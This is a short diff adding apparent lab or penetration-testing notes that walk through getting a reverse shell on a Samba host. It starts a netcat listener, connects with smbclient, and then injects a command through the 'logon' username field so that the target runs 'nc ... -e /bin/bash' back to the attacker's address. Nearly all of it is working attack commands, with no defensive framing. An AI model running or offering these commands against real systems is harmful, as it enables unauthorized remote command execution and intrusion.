@@ -1,0 +1,12 @@
+First start netcat listener:
+nc -nlvp 4444
+
+Next connet to remote machines SMB **remeber a folder has to be available to like /tmp
+
+smbclient //192.168.1.2/tmp
+
+Next use command to get a shell on machine you are attacking 
+
+logon "/'nc 192.168.2.33 4444 -e /bin/bash'"
+
+You should now have a reverse shell
